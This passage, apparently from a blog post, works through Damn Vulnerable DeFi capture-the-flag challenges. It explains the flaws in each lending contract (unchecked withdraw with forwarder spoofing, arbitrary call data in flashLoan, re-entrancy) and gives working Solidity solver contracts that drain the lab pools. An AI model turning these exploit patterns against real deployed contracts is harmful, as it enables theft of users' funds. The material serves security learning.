&lt;h3 id=&#34;Challenge-Solving-1&#34;&gt;&lt;a href=&#34;#Challenge-Solving-1&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The key is that by repeatedly calling the &lt;code&gt;flashLoan&lt;/code&gt; function, the fixed fee &lt;code&gt;FIXED_FEE&lt;/code&gt; can be exploited to gradually transfer all of the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s assets into the &lt;code&gt;pool&lt;/code&gt;. This process is repeated until the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s balance is completely drained.  &lt;/p&gt;
&lt;p&gt;After that, looking at the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L66&#34;&gt;pool.withdraw()&lt;/a&gt; function, you&amp;#x2019;ll notice that &lt;strong&gt;there are no authorization checks when withdrawing assets.&lt;/strong&gt; This allows us to easily withdraw all the assets accumulated in the &lt;code&gt;pool&lt;/code&gt; and send them to any address we want.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This challenge must be solved with no more than two transactions. To achieve this, you can use the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/Multicall.sol#L9&#34;&gt;MultiCall.multicall()&lt;/a&gt; function, which allows multiple function calls to be bundled together and executed within a single transaction.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i &amp;lt; data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the final step of the solution, we use the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/98028bbbc32c189b99241ba993d69d3517837e29/src/naive-receiver/BasicForwarder.sol#L55&#34;&gt;BasicForwarder.execute()&lt;/a&gt; function. The &lt;code&gt;BasicForwarder&lt;/code&gt; contract supports &lt;a href=&#34;https://www.alchemy.com/overviews/meta-transactions&#34;&gt;meta transactions&lt;/a&gt;, which allow gas fees to be paid on behalf of the user.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image4.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;In this challenge, to successfully withdraw all the assets from the &lt;code&gt;pool&lt;/code&gt;, the &lt;code&gt;_msgSender()&lt;/code&gt; must return the &lt;code&gt;deployer&lt;/code&gt;&amp;#x2019;s address when the &lt;code&gt;withdraw&lt;/code&gt; function is called. By using &lt;code&gt;BasicForwarder&lt;/code&gt;, we can satisfy this condition.  &lt;/p&gt;
&lt;p&gt;(Just FYI, a &lt;strong&gt;gas fee&lt;/strong&gt; refers to the fee paid whenever a transaction is recorded on the blockchain&amp;#x2014;such as when calling a smart contract function&amp;#x2014;on the actual mainnet.)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// NaiveReceiverPool.sol
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder &amp;amp;&amp;amp; msg.data.length &amp;gt;= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

// BasicForwarder.sol
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don&amp;apos;t copy returndata
        gasLeft := gas()
    }

    if (gasLeft &amp;lt; request.gas / 63) {
        assembly {
            invalid()
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The final attack flow can be summarized as follows:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Use the &lt;code&gt;multicall&lt;/code&gt; function to call the &lt;code&gt;flashLoan&lt;/code&gt; function 10 times, draining all of the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s assets into the &lt;code&gt;pool&lt;/code&gt;. Then, immediately call the &lt;code&gt;withdraw&lt;/code&gt; function to transfer all the funds from the &lt;code&gt;pool&lt;/code&gt; into the &lt;code&gt;recovery&lt;/code&gt; account.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Execute the entire process through &lt;code&gt;BasicForwarder&lt;/code&gt;, ensuring that everything is handled within a single transaction.  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory call_datas = new bytes[](11);
    // WETH_IN_RECEIVER = 10e18
    // FIXED_FEE = 1e8
    // calling flashLoan 10 times
    for(uint i = 0; i &amp;lt; 10; i++) {
        call_datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 9e18, &amp;quot;&amp;quot;));
    }

		// deposits[deployer] -= WETH_IN_POOL + WETH_IN_RECEIVER;
		// weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
    call_datas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(uint160(deployer))
    );

    bytes memory call_data = abi.encodeCall(Multicall.multicall, call_datas);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: call_data,
        deadline: block.timestamp + 1 days
    });

    // creating hash for request
    bytes32 request_hash = keccak256(
        abi.encodePacked(
            &amp;quot;\x19\x01&amp;quot;, // == EIP-712 signature, because BasicForwarder is EIP712
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );

    // r = 1st part of signature
    // s = 2nd part of signature
    // v = recovery ID
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request_hash);
    bytes memory signature = abi.encodePacked(r,s,v);

    forwarder.execute(request, signature);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-Truster-don&amp;#x2019;t-trust-borrower-too-much&#34;&gt;&lt;a href=&#34;#3-Truster-don&amp;#x2019;t-trust-borrower-too-much&#34; class=&#34;headerlink&#34; title=&#34;3. Truster: don&amp;#x2019;t trust borrower too much&#34;&gt;&lt;/a&gt;3. Truster: don&amp;#x2019;t trust borrower too much&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-2&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-2&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/truster/TrusterLenderPool.sol&#34;&gt;TrusterLenderPool.sol&lt;/a&gt; contract&amp;#x2019;s &lt;code&gt;flashLoan&lt;/code&gt; function provides an unsecured loan to the &lt;code&gt;borrower&lt;/code&gt;. What&amp;#x2019;s unusual here is that the logic for how the borrowed funds are used is passed in as the &lt;code&gt;data&lt;/code&gt; argument, which is then executed directly through a &lt;a href=&#34;https://rareskills.io/post/low-level-call-solidity&#34;&gt;call&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;After the function call finishes, the pool checks whether its balance (&lt;code&gt;token.balanceOf(address(this))&lt;/code&gt;) is less than it was before the loan (&lt;code&gt;balanceBefore&lt;/code&gt;). If it is, a &lt;code&gt;revert&lt;/code&gt; occurs. In other words, either the loan amount must be &lt;code&gt;0&lt;/code&gt;, or the borrowed funds must be repaid within the function passed through the &lt;code&gt;data&lt;/code&gt; argument.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// TrusterLenderPool.flashLoan
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) &amp;lt; balanceBefore) {
        revert RepayFailed();
    }

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-2&#34;&gt;&lt;a href=&#34;#Challenge-Solving-2&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The key issue here is that the &lt;code&gt;data&lt;/code&gt; argument allows us to call &lt;strong&gt;any function&lt;/strong&gt;. What happens if we call the &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/34d20fc027fe8d50da71428687024a29dc01748b/src/tokens/ERC20.sol#L68&#34;&gt;ERC20.approve()&lt;/a&gt; function?  &lt;/p&gt;
&lt;p&gt;The &lt;code&gt;approve&lt;/code&gt; function sets an &lt;a href=&#34;https://metaschool.so/articles/what-are-erc20-approve-erc20-allowance-methods&#34;&gt;allowance&lt;/a&gt;, which defines how many tokens a specific account (&lt;code&gt;spender&lt;/code&gt;) is allowed to withdraw from the caller&amp;#x2019;s (&lt;code&gt;msg.sender&lt;/code&gt;) account. Importantly, this operation &lt;strong&gt;does not affect the actual balance of the pool&lt;/strong&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// ERC20.approve
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since increasing the &lt;code&gt;allowance&lt;/code&gt; value only expands the withdrawal limit without affecting the actual balance of the &lt;code&gt;pool&lt;/code&gt;, the following approach can be taken:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call the &lt;code&gt;flashLoan()&lt;/code&gt; function with the loan amount (&lt;code&gt;amount&lt;/code&gt;) set to 0.  &lt;/li&gt;
&lt;li&gt;Use the &lt;code&gt;data&lt;/code&gt; argument to invoke the &lt;code&gt;ERC20.approve()&lt;/code&gt; function.  &lt;/li&gt;
&lt;li&gt;Pass the &lt;code&gt;if (token.balanceOf(address(this)) &amp;lt; balanceBefore)&lt;/code&gt; check, allowing the &lt;code&gt;flashLoan()&lt;/code&gt; function to complete successfully.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As a result, the &lt;code&gt;allowance&lt;/code&gt; value will be set high enough for the attacker to drain all of the &lt;code&gt;pool&lt;/code&gt;&amp;#x2019;s assets.  &lt;/p&gt;
&lt;p&gt;The full execution flow looks like this:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Call the &lt;code&gt;flashLoan()&lt;/code&gt; function, setting the loan amount (&lt;code&gt;amount&lt;/code&gt;) to 0.  &lt;/li&gt;
&lt;li&gt;Pass the &lt;code&gt;ERC20.approve()&lt;/code&gt; call through the &lt;code&gt;data&lt;/code&gt; argument, granting the attacker contract permission to withdraw all the &lt;code&gt;pool&lt;/code&gt;&amp;#x2019;s assets by adjusting the &lt;code&gt;allowance&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;Since the pool&amp;#x2019;s balance does not change, the &lt;code&gt;flashLoan()&lt;/code&gt; function finishes without any issues.  &lt;/li&gt;
&lt;li&gt;Using the permission obtained via &lt;code&gt;approve&lt;/code&gt;, the attacker then calls &lt;code&gt;transferFrom&lt;/code&gt; to drain all the funds from the &lt;code&gt;pool&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_truster() public checkSolvedByPlayer {
    new TrusterSolver(pool, recovery, token);
}

// ....

contract TrusterSolver {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // ERC20.approve(address(this), TOKENS_IN_POOL);
        // address(this) &amp;lt;- TrusterSolver contract
        bytes memory approve_call = abi.encodeCall(ERC20.approve, (address(this), TOKENS_IN_POOL));

        // amount = 0
        // borrower = address(this) = TrusterSolver contract
        // target = token
        // target.functionCall = token.functionCall(approve_call);
        pool.flashLoan(0, address(this), address(token), approve_call);

        // pool -&amp;gt; recovery to TOKENS_IN_POOL DVT
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;4-Side-Entrance-re-enter-the-contract&#34;&gt;&lt;a href=&#34;#4-Side-Entrance-re-enter-the-contract&#34; class=&#34;headerlink&#34; title=&#34;4. Side Entrance: re-enter the contract&#34;&gt;&lt;/a&gt;4. Side Entrance: re-enter the contract&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-3&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-3&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/side-entrance/SideEntranceLenderPool.sol#L35&#34;&gt;SideEntranceLenderPool.flashLoan()&lt;/a&gt; function allows the caller (&lt;code&gt;msg.sender&lt;/code&gt;) to borrow any amount of ETH without collateral. After granting the loan, it calls the &lt;code&gt;execute&lt;/code&gt; function defined in the &lt;code&gt;msg.sender&lt;/code&gt; contract, passing the borrowed amount (&lt;code&gt;amount&lt;/code&gt;) as &lt;code&gt;msg.value&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance &amp;lt; balanceBefore) {
        revert RepayFailed();
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;execute&lt;/code&gt; function is marked as &lt;a href=&#34;https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function&#34;&gt;payable&lt;/a&gt;, which means it can receive ETH when invoked. Through the &lt;code&gt;{value: amount}&lt;/code&gt; syntax, the caller sends exactly &lt;code&gt;amount&lt;/code&gt; of ETH to the callee when the function is executed.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;interface IFlashLoanEtherReceiver {
    function execute() external payable;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;SideEntranceLenderPool&lt;/code&gt; contract also provides deposit (&lt;code&gt;deposit&lt;/code&gt;) and withdrawal (&lt;code&gt;withdraw&lt;/code&gt;) functions, recording each user&amp;#x2019;s deposits in the &lt;code&gt;balances&lt;/code&gt; mapping.  &lt;/p&gt;
&lt;p&gt;For example, when the &lt;code&gt;withdraw()&lt;/code&gt; function is called, it sends the caller (&lt;code&gt;msg.sender&lt;/code&gt;) the amount stored in &lt;code&gt;balances&lt;/code&gt; using the &lt;a href=&#34;https://github.com/transmissions11/solmate/blob/50e15bb566f98b7174da9b0066126a4c3e75e0fd/src/utils/SafeTransferLib.sol#L15&#34;&gt;SafeTransferLib.safeTransferETH()&lt;/a&gt; function.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;contract SideEntranceLenderPool {
    mapping(address =&amp;gt; uint256) public balances;
    // ....
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-3&#34;&gt;&lt;a href=&#34;#Challenge-Solving-3&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The biggest issue with this contract is that it is vulnerable to a &lt;a href=&#34;https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md&#34;&gt;&lt;strong&gt;Re-entrancy&lt;/strong&gt;&lt;/a&gt; attack. Unlike contracts protected with mechanisms such as &lt;a href=&#34;https://medium.com/@mayankchhipa007/openzeppelin-reentrancy-guard-a-quickstart-guide-7f5e41ee388f&#34;&gt;ReentrancyGuard&lt;/a&gt;, this one has no such safeguards.  &lt;/p&gt;
&lt;p&gt;As shown in the diagram, when contract A calls a function (&lt;code&gt;flashLoan&lt;/code&gt;) of contract B, before the function completes, contract B can call back into contract A&amp;#x2019;s function (&lt;code&gt;execute&lt;/code&gt;), and within that function, A can once again call other functions or access objects in contract B to manipulate its state.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image5.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;Personally, I found this type of re-entrancy vulnerability to be very similar to side-effect vulnerabilities in browser JS engines.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Examples of JS engine side-effect vulnerabilities:  &lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32&#34;&gt;https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari&#34;&gt;https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug&#34;&gt;https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Just as side-effect bugs are a classic category of browser JS engine vulnerabilities, re-entrancy is one of the most representative vulnerability classes in smart contracts. It&amp;#x2019;s critical to fully understand it.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image6.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;The attack scenario is as follows:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;From the attacker contract, call the pool&amp;#x2019;s &lt;code&gt;flashLoan()&lt;/code&gt; function to borrow all ETH (&lt;code&gt;ETHER_IN_POOL&lt;/code&gt;).  &lt;/li&gt;
&lt;li&gt;The pool transfers the loan and invokes the attacker contract&amp;#x2019;s &lt;code&gt;execute()&lt;/code&gt; function.  &lt;/li&gt;
&lt;li&gt;Inside &lt;code&gt;execute()&lt;/code&gt;, deposit all borrowed ETH back into the pool using its &lt;code&gt;deposit()&lt;/code&gt; function. This results in the borrowed amount being recorded under &lt;code&gt;balances[attacker contract address]&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;Once &lt;code&gt;execute()&lt;/code&gt; finishes, control returns to the &lt;code&gt;flashLoan()&lt;/code&gt; function. Since the pool&amp;#x2019;s balance is unchanged from before the loan, the &lt;code&gt;RepayFailed()&lt;/code&gt; check is not triggered, and the function completes successfully.  &lt;/li&gt;
&lt;li&gt;Finally, from the attacker contract, call the pool&amp;#x2019;s &lt;code&gt;withdraw()&lt;/code&gt; function to withdraw the amount recorded in &lt;code&gt;balances&lt;/code&gt;. This allows the attacker to legally drain the funds and transfer them to &lt;code&gt;recovery&lt;/code&gt;.  &lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceSolver solver = new SideEntranceSolver(pool, recovery);
    solver.solve();
}

// ....

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool _pool;
    address _recovery;

    constructor(SideEntranceLenderPool pool, address recovery) {
        _pool = pool;
        _recovery = recovery;
    }

    function solve() public {
        _pool.flashLoan(ETHER_IN_POOL);
        _pool.withdraw();
        payable(_recovery).transfer(ETHER_IN_POOL);
    }

    function execute() external payable override {
		    // send ETHER_IN_POOL to _pool
        _pool.deposit{value: ETHER_IN_POOL}();
    }
    
    // receive() required if payable function exists on contract
    receive() external payable {}
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;5-The-Rewarder-claim-your-reward-s&#34;&gt;&lt;a href=&#34;#5-The-Rewarder-claim-your-reward-s&#34; class=&#34;headerlink&#34; title=&#34;5. The Rewarder: claim your reward(s)&#34;&gt;&lt;/a&gt;5. The Rewarder: claim your reward(s)&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-4&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-4&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;This time, instead of offering a flash loan service, the contract provides rewards in the form of &lt;code&gt;DamnValuableToken&lt;/code&gt; and &lt;code&gt;WETH&lt;/code&gt; to a specific list of addresses.  &lt;/p&gt;
&lt;p&gt;The eligible addresses and the corresponding reward amounts are defined as follows:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Distribution of &lt;code&gt;DamnValuableToken&lt;/code&gt; rewards is specified in &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/dvt-distribution.json&#34;&gt;dvt-distribution.json&lt;/a&gt;.  &lt;/li&gt;
&lt;li&gt;Distribution of &lt;code&gt;WETH&lt;/code&gt; rewards is specified in &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/weth-distribution.json&#34;&gt;weth-distribution.json&lt;/a&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs json&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// dvt-distribution.json&lt;/span&gt;
[
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;4665241241345036&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;9214418266997362&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;2502024387994809&lt;/span&gt;
    },
    ...

&lt;span class=&#34;hljs-comment&#34;&gt;// weth-distribution.json&lt;/span&gt;
[
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;3726409081682308&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;870420547863448&lt;/span&gt;
    },
    {
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;address&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&amp;quot;&lt;/span&gt;,
        &lt;span class=&#34;hljs-attr&#34;&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;228382988128225&lt;/span&gt;
    },
    ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Looking at the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/the-rewarder/TheRewarderDistributor.sol#L81&#34;&gt;TheRewardDistributor.claimRewards()&lt;/a&gt; function, you can see that it is implemented to handle multiple reward claims in a single batch. This kind of design&amp;#x2014;accepting multiple requests and processing them within a single transaction&amp;#x2014;is widely adopted in many smart contract implementations to &lt;strong&gt;save on gas fees&lt;/strong&gt;.  &lt;/p&gt;
&lt;p&gt;By the way, there&amp;#x2019;s a vulnerability hidden in this function. Can you spot it? &amp;#x1F60A;  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber =&amp;gt; bytes32 root) roots;
    mapping(address claimer =&amp;gt; mapping(uint256 word =&amp;gt; uint256 bits)) claims;
}

// ....

// Allow claiming rewards of multiple tokens in a single transaction
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i &amp;lt; inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 &amp;lt;&amp;lt; bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 &amp;lt;&amp;lt; bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}

function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord &amp;amp; newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-4&#34;&gt;&lt;a href=&#34;#Challenge-Solving-4&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The &lt;code&gt;_setClaimed()&lt;/code&gt; function records whether a reward has already been claimed using a bitmap. However, if you look closely at the logic inside &lt;code&gt;claimRewards()&lt;/code&gt;, you&amp;#x2019;ll see that the values for &lt;code&gt;bitsSet&lt;/code&gt; (claim record) and &lt;code&gt;amount&lt;/code&gt; (claim amount) are continuously accumulated.  &lt;/p&gt;
&lt;p&gt;The important detail is that &lt;code&gt;_setClaimed()&lt;/code&gt; is only called &lt;strong&gt;at the end of the loop&lt;/strong&gt; or &lt;strong&gt;when the type of token being processed changes&lt;/strong&gt;, at which point the accumulated claim record is finally stored.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;        bitsSet = bitsSet | 1 &amp;lt;&amp;lt; bitPosition;
        amount += inputClaim.amount;

// ....

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
&lt;/code&gt;&lt;/pre&gt;
